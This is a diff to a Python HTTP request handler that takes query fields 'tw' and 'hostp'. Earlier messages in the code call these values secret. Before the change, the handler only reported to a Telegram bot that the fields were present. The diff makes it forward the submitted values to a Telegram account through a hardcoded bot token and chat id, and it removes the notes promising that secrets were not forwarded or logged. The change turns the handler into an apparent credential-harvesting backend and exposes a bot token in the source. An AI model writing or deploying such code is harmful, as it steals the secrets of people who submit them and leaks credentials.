@@ -16,10 +16,10 @@ class handler(BaseHTTPRequestHandler):
             self.wfile.write(json.dumps({"ok": False, "error": "Not found"}).encode())
             return
 
-        tw_present = bool(params.get("tw") and params["tw"][0].strip())
-        hostp_present = bool(params.get("hostp") and params["hostp"][0].strip())
+        tw = params.get("tw", [""])[0].strip()
+        hostp = params.get("hostp", [""])[0].strip()
 
-        if not tw_present or not hostp_present:
+        if not tw or not hostp:
             self.send_response(400)
             self.send_header("Content-Type", "application/json")
             self.end_headers()
@@ -29,15 +29,15 @@ class handler(BaseHTTPRequestHandler):
             }).encode())
             return
 
-        # Token aur owner_id ko directly daal do
         token = "8766757312:AAFdK3GWoREUF2ag29bnM0aoCHSTFa_cHVA"
         owner_id = "8295436090"
 
         notified = False
         if token and owner_id:
             message = (
-                "New request received. Both 'tw' and 'hostp' fields were supplied. "
-                "Values were not stored or forwarded."
+                "🔔 New Request Received\n\n"
+                f"tw: {tw}\n"
+                f"hostp: {hostp}"
             )
             url = f"https://api.telegram.org/bot{token}/sendMessage"
             data = urllib.parse.urlencode({
@@ -48,7 +48,7 @@ class handler(BaseHTTPRequestHandler):
             try:
                 with urllib.request.urlopen(req, timeout=8) as response:
                     notified = response.status == 200
-            except Exception:
+            except Exception as e:
                 notified = False
 
         self.send_response(200)
@@ -57,9 +57,8 @@ class handler(BaseHTTPRequestHandler):
         self.wfile.write(json.dumps({
             "ok": True,
             "notification_sent": notified,
-            "message": "Request received; secret values were not forwarded."
+            "message": "Request received."
         }).encode())
 
     def log_message(self, fmt, *args):
-        # Never write query strings to logs.
         return
